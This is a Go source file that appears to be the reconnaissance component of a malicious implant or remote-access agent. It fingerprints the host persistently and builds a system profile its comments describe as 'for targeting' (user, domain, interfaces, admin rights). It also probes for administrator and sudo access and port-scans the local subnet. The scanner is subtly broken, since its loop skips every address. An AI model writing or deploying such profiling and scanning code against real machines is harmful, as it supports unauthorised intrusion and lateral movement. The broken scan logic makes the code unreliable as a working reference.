package agent

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Fingerprint generates a unique, persistent identifier for the host.
// Uses hardware-based attributes that survive reboots and reinstalls.
func Fingerprint() string {
	var components []string

	// 1. MAC addresses (primary identifier)
	if macs := getMACAddresses(); len(macs) > 0 {
		components = append(components, macs...)
	}

	// 2. CPU info
	if cpu := getCPUInfo(); cpu != "" {
		components = append(components, cpu)
	}

	// 3. Hostname
	if hostname, _ := os.Hostname(); hostname != "" {
		components = append(components, hostname)
	}

	// 4. OS info
	components = append(components, fmt.Sprintf("%s/%s", runtime.GOOS, runtime.GOARCH))

	// 5. Disk serial (Linux)
	if disk := getDiskSerial(); disk != "" {
		components = append(components, disk)
	}

	// Combine and hash
	input := strings.Join(components, "|")
	hash := sha256.Sum256([]byte(input))
	return hex.EncodeToString(hash[:16]) // First 16 bytes = 32 hex chars
}

// GetSystemProfile returns comprehensive system information for targeting.
func GetSystemProfile() map[string]interface{} {
	profile := make(map[string]interface{})

	profile["os"] = runtime.GOOS
	profile["arch"] = runtime.GOARCH
	profile["hostname"], _ = os.Hostname()
	profile["username"] = os.Getenv("USER")
	if profile["username"] == "" {
		profile["username"] = os.Getenv("USERNAME")
	}
	profile["cpus"] = runtime.NumCPU()
	profile["fingerprint"] = Fingerprint()

	// Network info
	if ifaces, err := getNetworkInterfaces(); err == nil {
		profile["interfaces"] = ifaces
	}

	// Domain info (Windows)
	if runtime.GOOS == "windows" {
		profile["domain"] = os.Getenv("USERDOMAIN")
		profile["computername"] = os.Getenv("COMPUTERNAME")
	}

	// Linux specific
	if runtime.GOOS == "linux" {
		if distro := getLinuxDistro(); distro != "" {
			profile["distro"] = distro
		}
		if kernel := getKernelVersion(); kernel != "" {
			profile["kernel"] = kernel
		}
	}

	// macOS specific
	if runtime.GOOS == "darwin" {
		if ver := getMacOSVersion(); ver != "" {
			profile["macos_version"] = ver
		}
	}

	// Privilege level
	profile["is_admin"] = isAdmin()
	profile["uid"] = os.Getuid()

	return profile
}

// CheckPrivileges determines the current privilege level.
func CheckPrivileges() string {
	if runtime.GOOS == "windows" {
		// Check for admin token
		cmd := exec.Command("net", "session")
		if err := cmd.Run(); err == nil {
			return "administrator"
		}
		return "user"
	}

	if os.Geteuid() == 0 {
		return "root"
	}

	// Check for sudo access
	cmd := exec.Command("sudo", "-n", "true")
	if err := cmd.Run(); err == nil {
		return "sudoer"
	}

	return "user"
}

// EnumerateNetwork discovers live hosts on the local network.
func EnumerateNetwork(cidr string) []string {
	var hosts []string

	// Parse CIDR
	ip, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return hosts
	}

	// Scan common ports on each IP
	for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); incIP(ip) {
		target := ip.String()
		if target == ip.String() {
			continue
		}

		// Quick TCP scan on common ports
		ports := []int{22, 80, 443, 445, 3389, 8080}
		for _, port := range ports {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 500*time.Millisecond)
			if err == nil {
				conn.Close()
				hosts = append(hosts, fmt.Sprintf("%s:%d (open)", target, port))
				break
			}
		}
	}

	return hosts
}

func getMACAddresses() []string {
	var macs []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return macs
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			mac := iface.HardwareAddr.String()
			if mac != "" {
				macs = append(macs, mac)
			}
		}
	}

	return macs
}

func getCPUInfo() string {
	switch runtime.GOOS {
	case "linux":
		data, _ := os.ReadFile("/proc/cpuinfo")
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "model name") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	case "darwin":
		out, _ := exec.Command("sysctl", "-n", "machdep.cpu.brand_string").Output()
		return strings.TrimSpace(string(out))
	case "windows":
		out, _ := exec.Command("wmic", "cpu", "get", "name", "/format:list").Output()
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "Name=") {
				return strings.TrimSpace(strings.TrimPrefix(line, "Name="))
			}
		}
	}
	return ""
}

func getDiskSerial() string {
	if runtime.GOOS != "linux" {
		return ""
	}

	// Try to get disk serial from sysfs
	serials := []string{
		"/sys/block/sda/device/serial",
		"/sys/block/nvme0n1/device/serial",
		"/sys/block/vda/device/serial",
	}

	for _, path := range serials {
		if data, err := os.ReadFile(path); err == nil {
			return strings.TrimSpace(string(data))
		}
	}

	return ""
}

func getNetworkInterfaces() ([]map[string]string, error) {
	var result []map[string]string

	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface := range ifaces {
		info := map[string]string{
			"name":  iface.Name,
			"mac":   iface.HardwareAddr.String(),
			"flags": iface.Flags.String(),
		}

		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					info["ipv4"] = ipnet.IP.String()
				}
			}
		}

		result = append(result, info)
	}

	return result, nil
}

func getLinuxDistro() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return ""
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			return strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
		}
	}

	return ""
}

func getKernelVersion() string {
	out, _ := exec.Command("uname", "-r").Output()
	return strings.TrimSpace(string(out))
}

func getMacOSVersion() string {
	out, _ := exec.Command("sw_vers", "-productVersion").Output()
	return strings.TrimSpace(string(out))
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
